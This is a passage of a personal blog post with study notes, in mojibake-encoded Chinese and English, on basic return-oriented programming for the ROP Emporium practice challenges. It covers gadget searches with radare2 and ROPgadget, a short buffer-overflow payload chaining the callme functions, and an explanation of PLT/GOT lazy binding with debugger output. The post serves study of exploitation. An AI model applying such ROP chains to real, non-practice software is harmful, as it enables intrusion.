<p>æ‰€ä»¥è¦æŠ¥å­—ç¬¦ä¸²åœ°å€ä¼ åˆ°RDIä¸­<br><a target="_blank" rel="noopener" href="https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching">https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching</a><br><a target="_blank" rel="noopener" href="https://trustfoundry.net/basic-rop-techniques-and-tricks/">https://trustfoundry.net/basic-rop-techniques-and-tricks/</a></p>
<h3 id="å¦‚ä½•æœç´¢gadget"><a href="#å¦‚ä½•æœç´¢gadget" class="headerlink" title="å¦‚ä½•æœç´¢gadget"></a>å¦‚ä½•æœç´¢gadget</h3><p><a target="_blank" rel="noopener" href="https://ropemporium.com/guide.html">https://ropemporium.com/guide.html</a><br>äº”ç§å·¥å…·ï¼Œæˆ‘ç”¨äº†radare2 å’Œ ROPgadget</p>
<h4 id="radare2ä¸­"><a href="#radare2ä¸­" class="headerlink" title="radare2ä¸­"></a>radare2ä¸­</h4><pre><code>/R [?] â€” Search for ROP gadgets
/R/ â€” Search for ROP gadgets with a regular expressions</code></pre>
<p>å¤ªæš´åŠ›äº†</p>
<pre><code>[0x00400742]&gt; /R pop rdi
  0x004007c3                 5f  pop rdi
  0x004007c4                 c3  ret</code></pre>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p><code>ROPgadget --binary   | grep</code></p>
<h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><p>32ä½</p>
<pre><code>ROPgadget --binary ./callme32 --only &#39;add esp&#39;
callme1=p32(0x080484f0)
callme2=p32(0x08048550)
callme3=p32(0x080484e0)

addpopret=p32(0x080484aa)
#0x080484aa : add esp, 8 ; pop ebx ; ret
args1=p32(0xdeadbeef)
args2=p32(0xcafebabe)
args3=p32(0xd00df00d)

# rop1s
gadget=addpopret+args1+args2+args3
offset = 44
payload = b&#39;A&#39;*offset
payload += callme1+ gadget+  callme2+gadget+callme3+gadget</code></pre>
<p>64ä½<br>64ä½ä¸‹ä¼ å‚</p>
<pre><code>â”‚           0x0040091e      ba06000000     mov edx, 6
â”‚           0x00400923      be05000000     mov esi, 5
â”‚           0x00400928      bf04000000     mov edi, 4
â”‚           0x0040092d      e8eefdffff     call sym.imp.callme_one</code></pre>
<p>æ‰€ä»¥ç”¨<br>    #0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</p>
<h2 id="PLT-å’Œ-GOT-PLT"><a href="#PLT-å’Œ-GOT-PLT" class="headerlink" title="PLT å’Œ GOT.PLT"></a>PLT å’Œ GOT.PLT</h2><p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a><br><code>å‡½æ•°å’Œå˜é‡ä½œä¸ºç¬¦å·</code>è¢«å­˜åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­, ä¸åŒç±»å‹çš„ç¬¦å·åˆèšåˆåœ¨ä¸€èµ·, ç§°ä¸º<code>ç¬¦å·è¡¨</code></p>
<p> <a target="_blank" rel="noopener" href="https://ropemporium.com/guide.html#Appendix%20A">https://ropemporium.com/guide.html#Appendix%20A</a><br>how the PLT is used in <code>lazy binding</code>?<br>Lazy binding is a technique used by the dynamic linker<br>symbol lookups for function calls into shared objects are deferred until the first time a function is actually called.<br>å¯¹å…±äº«å¯¹è±¡çš„å‡½æ•°è°ƒç”¨çš„ç¬¦å·æŸ¥æ‰¾ åªæœ‰å½“ç¬¬ä¸€ä¸ªå‡½æ•°çœŸçš„è°ƒç”¨æ—¶æ‰æŸ¥æ‰¾<br>Two program sections are used to achieve this effect<br> the<code>procedure linkage table (.plt)</code>and part of the <code>global offset table (.got.plt).</code><br>Lazy binding may be disabled by setting the LD_BIND_NOW environment variable to a nonempty string or using the RTLD_NOW flag when calling dlopen().<br>The first time an external function is called it, <strong>must be resolved</strong>. After that, all calls to it will be passed straight through to the desired function<br><code>rabin2 -R    relocations</code></p>
<h3 id="plt-èŠ‚"><a href="#plt-èŠ‚" class="headerlink" title=".plt èŠ‚"></a>.plt èŠ‚</h3><p><a target="_blank" rel="noopener" href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a><br>æ¯”å¦‚3 function stubs<br>take the form <code>jmp; push; jmp</code>;. Above the stubs a <code>push; jmp;</code></p>
<pre><code>â–º 0x8049030  &lt;puts@plt&gt;                  jmp    dword ptr [puts@got.plt] &lt;0x804c00c&gt; </code></pre>
<p>é—´æ¥è·³è½¬</p>
<pre><code> pwndbg&gt; x/wx 0x804c00c
 0x804c00c &lt;puts@got.plt&gt;:    0x08049036

   0x8049036  &lt;puts@plt+6&gt;                push   0
   0x804903b  &lt;puts@plt+11&gt;               jmp    0x8049020 &lt;0x8049020&gt;</code></pre>
<p>it turns out that because we havenâ€™t called puts before<br><strong>è¿˜æ²¡æœ‰ä½¿ç”¨putsï¼Œè·³è½¬åˆ°gotåˆè·³å›åˆ°ä¸‹ä¸€å‘½ä»¤</strong><br>æœ€åå›åˆ°<code>.plt</code>è¡¨å¼€å¤´<br>      0x8049020                              push   dword ptr [<em>GLOBAL_OFFSET_TABLE</em>+4] &lt;0x804c004&gt;<br>     â–º 0x8049026                              jmp    dword ptr [0x804c008] &lt;_dl_runtime_resolve&gt;</p>
<pre><code>pwndbg&gt; x/2xw 0x804c004
0x804c004:    0xf7ffd980    0xf7fe9730</code></pre>
<p>ç¬¬ä¸€ä¸ªåœ¨è¿æ¥å™¨æ•°æ®æ®µæ˜¯<code>link_mapåœ°å€</code>ï¼Œç¬¬äºŒä¸ªåœ¨è¿æ¥å™¨æ‰§è¡Œä»£ç å¤„æ˜¯<code>_dl_runtime_resolveåœ°å€</code><br>pltå¼€å¤´ä¸¤ä¸ªæ˜¯æ¥ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶æŸ¥åœ°å€çš„</p>
<p>å› æ­¤, å®é™…ä¸Š(ç¬¬ä¸€æ¬¡)è°ƒç”¨puts@pltå°±ç›¸å½“äºè°ƒç”¨äº†<br><code>_dl_runtime_resolve((link_map *)m, 0)!</code> å…¶ä¸­link_mapæä¾›äº†è¿è¡Œæ—¶çš„å¿…è¦ä¿¡æ¯,<br>è€Œ0åˆ™æ˜¯putså‡½æ•°çš„åç§»<code>(åœ¨puts@pltä¸­push 0x0)</code>.</p>
<p>resolveæ‰§è¡Œå®Œåï¼šï¼š<br>    pwndbg&gt; disass â€˜puts@pltâ€™<br>    Dump of assembler code for function puts@plt:<br>       0x08049030 &lt;+0&gt;:    jmp    DWORD PTR ds:0x804c00c<br>       0x08049036 &lt;+6&gt;:    push   0x0<br>       0x0804903b &lt;+11&gt;:    jmp    0x8049020<br>    End of assembler dump.</p>
<pre><code>pwndbg&gt; x/wx 0x804c00c
0x804c00c &lt;puts@got.plt&gt;:    0xf7e303c0
pwndbg&gt; info symbol 0xf7e303c0
puts in section .text of /lib/i386-linux-gnu/libc.so.6</code></pre>
<p>æ‰¾åˆ°putsçš„ä»£ç åœ°å€</p>
<h3 id="æ”»å‡»é˜²å¾¡"><a href="#æ”»å‡»é˜²å¾¡" class="headerlink" title="æ”»å‡»é˜²å¾¡"></a>æ”»å‡»é˜²å¾¡</h3><p>é˜²æ­¢å†™got.pltè¡¨<br><code>Enter relocations read-only, or RELRO.</code></p>
<p>a strategy was developed to allow looking up all of these addresses when the program was run and providing a mechanism to call these functions from libraries. This is known as relocation</p>
<h3 id="got"><a href="#got" class="headerlink" title=".got"></a>.got</h3><p>This is the GOT, or Global Offset Table. This is the <code>actual table of offsets </code>as filled in by the linker for external symbols.<br>.plt<br>This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)<br>.got.plt<br>This is the GOT for the PLT. It contains the<code>target addresses</code>(after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section</p>
<p>.GOT å¼€å¤´åŒ…å«å®é™…åœ°å€ï¼Œ.pltå¼€å¤´æ˜¯è¦è·³è½¬åˆ°ç›®æ ‡<br>pwndbg&gt; x/i $pc<br>=&gt; 0x804845f &lt;main+36&gt;:    call   0x8048300 &lt;puts@plt&gt;</p>
<p>.got.pltè¡¨å†…å®¹<br>got0: æœ¬ELFåŠ¨æ€æ®µ(.dynamicæ®µ)çš„è£…è½½åœ°å€<br>got1: æœ¬ELFçš„link_mapæ•°æ®ç»“æ„æè¿°ç¬¦åœ°å€<br>got2: _dl_runtime_resolveå‡½æ•°çš„åœ°å€<br><a target="_blank" rel="noopener" href="https://ropemporium.com/image/example_gotplt_section.png"><img src="https://ropemporium.com/image/example_gotplt_section.png"></a></p>
<hr>
<h2 id="x86-get-pc-thunk-ax"><a href="#x86-get-pc-thunk-ax" class="headerlink" title="__x86.get_pc_thunk.ax"></a>__x86.get_pc_thunk.ax</h2><p>objdump -d main_pi | grep â€œ__x86.get_pc_thunk.axâ€ -A 2<br>000006ad &lt;__x86.get_pc_thunk.ax&gt;:<br> 6ad:    8b 04 24                 mov    eax,DWORD PTR [esp]<br> 6b0:    c3                       ret<br>ä½œç”¨å°±æ˜¯æŠŠesp(å³è¿”å›åœ°å€)çš„å€¼ä¿å­˜åœ¨eax(PICå¯„å­˜å™¨)ä¸­, åœ¨æ¥ä¸‹æ¥å¯»å€ç”¨<br>è¯¦è§<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a></p>
<h2 id="CTF-WIKI-ROP"><a href="#CTF-WIKI-ROP" class="headerlink" title="CTF-WIKI ROP"></a>CTF-WIKI ROP</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/</a><br>ROP</p>
<h3 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h3><p><code>gdb vmmap </code></p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>æœ¬æ–‡ä½œè€…ï¼š </strong>finsenty54
  </li>
  <li class="post-copyright-link">
      <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
      <a href="http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/" title="&lt;&lt;åŸºæœ¬ROP_ropemporiumå‰ä¸‰é¢˜">http://finsenty54.github.io/2021/01/11/åŸºæœ¬ROP/</a>
  </li>
  <li class="post-copyright-license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>
</div>

          

  <div class="followme">
    <span>æ¬¢è¿å…³æ³¨æˆ‘çš„å…¶å®ƒå‘å¸ƒæ¸ é“</span>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
        </div>
    </div>
  </div>

          <div class="post-tags">
              <a href="/tags/PWN/" rel="tag"># PWN</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/01/08/Stack_buffer_overflow_basic_5/" rel="prev" title="Stack buffer overflow basic 5">
                  <i class="fa fa-chevron-left"></i> Stack buffer overflow basic 5
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
  
  
  



      
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 2019 â€“ 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">finsenty54</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>ç«™ç‚¹æ€»å­—æ•°ï¼š</span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">215k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>ç«™ç‚¹é˜…è¯»æ—¶é•¿ &asymp;</span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">3:15</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/local-search.js"></script>












  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>








  

  
<script>
NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: "/2021/01/11/%E5%9F%BA%E6%9C%ACROP/",
    }, {"enable":true,"appId":"3uGsbMNvxiG0LkbyciDSaxmY-MdYXbMMI","appKey":"1dU1y3SudPaV6pdTET96j5M2","placeholder":"æ¬¢è¿äº¤æµè®¨è®º...","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
    ));
  }, window.Valine);
});
</script>

  <!-- é¡µé¢ç‚¹å‡»å°çº¢å¿ƒ -->
  <script type="text/javascript" src="/js/clicklove.js"></script>
  <!--<script type="text/javascript"
color="0,0,0" opacity='0.5' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
  </script>-->
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
</html>
